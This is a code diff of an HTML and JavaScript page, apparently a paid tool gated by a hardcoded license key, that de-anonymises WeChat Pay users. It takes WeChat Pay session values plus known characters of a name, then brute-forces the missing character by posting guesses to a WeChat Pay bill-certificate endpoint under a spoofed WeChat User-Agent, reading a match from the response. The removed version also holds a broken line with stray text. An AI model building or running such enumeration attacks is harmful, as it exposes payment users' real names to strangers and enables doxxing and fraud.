@@ -1,119 +1,164 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>鱼笙微信账单反查</title>
 <style>
-*{box-sizing:border-box;font-family:Arial}
-body{max-width:400px;margin:30px auto;padding:0 15px;background:#f4f4f4}
-.main{background:#fff;padding:20px;border-radius:12px;box-shadow:0 0 10px #00000010}
-input,select,button{
-width:100%;padding:10px;margin:6px 0;
-border:1px solid #ddd;border-radius:8px;font-size:15px
-}
-button{
-background:#07c160;color:white;border:none;font-weight:bold;
-cursor:pointer
-}
-#result{
-margin-top:12px;padding:10px;border-radius:8px;text-align:center;font-weight:bold
-}
+  *{box-sizing:border-box;font-family:system-ui,-apple-system}
+  body{margin:0;padding:15px;background:#f6f7f9}
+  .page{max-width:420px;margin:0 auto}
+  .card{background:white;border-radius:16px;padding:20px;margin-bottom:12px;box-shadow:0 2px 10px rgba(0,0,0,0.06)}
+  h2{text-align:center;margin-top:6px}
+  .title{font-size:13px;color:#666;margin-bottom:4px}
+  input,select{
+    width:100%;padding:12px 14px;border:1px solid #e5e7eb;
+    border-radius:12px;margin-bottom:10px;font-size:15px
+  }
+  button{
+    width:100%;padding:14px;border:none;border-radius:12px;
+    background:#07c160;color:white;font-size:16px;font-weight:bold
+  }
+  button:active{opacity:.9}
+
+  /* 结果反馈页面 */
+  .result-page{
+    position:fixed;top:0;left:0;right:0;bottom:0;
+    background:white;z-index:999;padding:40px 20px;
+    display:none;flex-direction:column;align-items:center;justify-content:center
+  }
+  .result-page.show{display:flex}
+  .icon{font-size:60px;margin-bottom:20px}
+  .msg{font-size:20px;font-weight:bold;margin-bottom:10px}
+  .name{font-size:24px;color:#07c160;margin:10px 0}
+  .tip{font-size:14px;color:#666;margin-bottom:30px}
+  .back{
+    padding:12px 30px;border-radius:12px;background:#f2f3f5;
+    font-weight:bold
+  }
 </style>
-</head>
-<body>
-<div class="main">
-<h3 style="text-align:center;margin-top:0">鱼笙微信账单反实名</h3>
 
-卡密：<input type="text" id="key" placeholder="请输入卡密">
-ek_sid：<input type="text" id="ek_sid">
-uin_session：<input type="text" id="uin_session">
-wxp_log_uid：<input type="text" id="wxp_log_uid">
+<div class="page">
+  <div class="card">
+    <h2>鱼笙微信账单反实名</h2>
 
-姓名长度：
-<select id="name_len">
-<option value="2">2字姓名</option>
-<option value="3">3字姓名</option>
-</select>
+    <div class="title">卡密</div>
+    <input id="key" placeholder="请输入卡密">
 
-首字（3字填）：<input type="text" id="first">
-尾字（必填）：<input type="text" id="last">
+    <div class="title">ek_sid</div>
+    <input id="ek_sid">
 
-<button onclick="start()">开始查询</button>
-<div id="result"></div>
+    <div class="title">uin_session</div>
+    <input id="uin_session">
+
+    <div class="title">wxp_log_uid</div>
+    <input id="wxp_log_uid">
+
+    <div class="title">姓名长度</div>
+    <select id="len">
+      <option value="2">2字姓名</option>
+      <option value="3">3字姓名</option>
+    </select>
+
+    <div class="title">首字（3字姓名填）</div>
+    <input id="first">
+
+    <div class="title">尾字（必填）</div>
+    <input id="last">
+
+    <button onclick="startQuery()">开始查询</button>
+  </div>
+</div>
+
+<!-- 结果反馈页面（弹层） -->
+<div class="result-page" id="resultPage">
+  <div class="icon" id="icon">✅</div>
+  <div class="msg" id="msgText">查询成功</div>
+  <div class="name" id="nameText"></div>
+  <div class="tip" id="tipText"></div>
+  <div class="back" onclick="closeResult()">返回查询</div>
+</div>
 
 <script>
-// ========== 卡密（你自己改这个）==========
-const MY_KEY = "yusheng666";
+  // ========== 卡密 ==========
+  const KEY = "yusheng666"
 
-// ========== 字库 ==========
-const CHAR_POOL = "文子俊泽宇嘉浩晨一熠博睿梓恒毅建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同春夏秋冬东南西北天地日月江河湖海二三四五六七八九十百千万";
+  // ========== 字库 ==========
+  const CHAR_POOL = "文子俊泽宇一熠嘉浩晨博睿梓恒毅海建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同春夏秋冬东南西北天地日月江河湖二三四五六七八九十百千万"
 
-const URL = "https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan";
+  const URL = "https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan"
 
-async function start(){
-let r = document.getElementById("result");
-r.textContent = "查询中...";
-r.style.color = "#333";
+  let resultPage = document.getElementById("resultPage")
+  let icon = document.getElementById("icon")
+  let msgText = document.getElementById("msgText")
+  let nameText = document.getElementById("nameText")
+  let tipText = document.getElementById("tipText")
 
-let key = document.getElementById("key").value.trim();
-let ek_sid = document.getElementById("ek_sid").value.trim();
-let uin_session = document.getElementById("uin_session").value.trim();
-let wxp_log_uid = document.getElementById("wxp_log_uid").value.trim();
-let name_len = document.getElementById("name_len").value;
-let first = document.getElementById("first").value.trim();
-let last = document.getElementById("last").value.trim();
+  function showResult(success, name = "") {
+    resultPage.classList.add("show")
+    if (success) {
+      icon.textContent = "✅"
+      icon.style.color = "#07c160"
+      msgText.textContent = "查询成功"
+      nameText.textContent = name
+      tipText.textContent = "已匹配到真实姓名"
+    } else {
+      icon.textContent = "❌"
+      icon.style.color = "#fa3f3f"
+      msgText.textContent = "查询失败"
+      nameText.textContent = ""
+      tipText.textContent = "未匹配到对应姓名"
+    }
+  }
 
-if(key !== MY_KEY){
-r.textContent = "❌ 卡密错误";
-r.style.color = "red";
-return;
-}
+  function closeResult() {
+    resultPage.classList.remove("show")
+  }
 
-if(!ek_sid || !uin_session || !wxp_log_uid || !last){
-r.textContent = "❌ 信息不能为空";
-r.style.color = "red";
-return;
-}
+  async function startQuery() {
+    let key = document.getElementById("key").value.trim()
+    let ek_sid = document.getElementById("ek_sid").value.trim()
+    let uin_session = document.getElementById("uin_session").value.trim()
+    let wxp_log_uid = document.getElementById("wxp_log_uid").value.trim()
+    let len = document.getElementById("len").value
+    let first = document.getElementById("first").value.trim()
+    let last = document.getElementById("last").value.trim()
 
-let headers = {
-"Content-Type": "application/json;charset=utf-8",
-"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.69 NetType/WIFI Language/zh_CN"
-};
+    if (key !== KEY) {
+      alert("卡密错误")
+      return
+    }
+    if (!ek_sid || !uin_session || !wxp_log_uid || !last) {
+      alert("请填写完整信息")
+      return
+    }
 
-try{
-for(let c of CHAR_POOL){
-let name = name_len == 3 ? (first + c + last) : (c + last);
+    let headers = {
+      "Content-Type": "application/json;charset=utf-8",
+      "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.69 NetType/WIFI Language/zh_CN"
+    }
 
-let res = await fetch(URL, {
-method: "POST",
-headers: headers,
-body: JSON.stringify({ respondent_true_name: name }),
-mode: "cors"
-});
+    try {
+      for (let c of CHAR_POOL) {
+        let name = len == 3 ? (first + c + last) : (c + last)
 
-let text = await res.text();
-if(
-text.includes("成功") ||
-text.includes("face") ||
-text.includes("scan") ||
-text.includes("核验")
-){
-r.textContent = "✅ 真实姓名：" + name 若显示次数过多稍后重试会出错;
-r.style.color = "green";
-return;
-}
+        let resp = await fetch(URL, {
+          method: "POST",
+          headers,
+          body: JSON.stringify({ respondent_true_name: name }),
+          mode: "cors"
+        })
 
-await new Promise(r=>setTimeout(r,350));
-}
-r.textContent = "❌ 未找到";
-r.style.color = "red";
-}catch(e){
-r.textContent = "❌ 请求失败：" + e.message;
-r.style.color = "red";
-}
-}
+        let t = await resp.text()
+        if (t.includes("成功") || t.includes("face") || t.includes("scan") || t.includes("核验")) {
+          showResult(true, name)
+          return
+        }
+
+        await new Promise(r => setTimeout(r, 350))
+      }
+
+      showResult(false)
+    } catch (e) {
+      alert("请求异常：" + e.message)
+    }
+  }
 </script>
-</div>
-</body>
-</html>
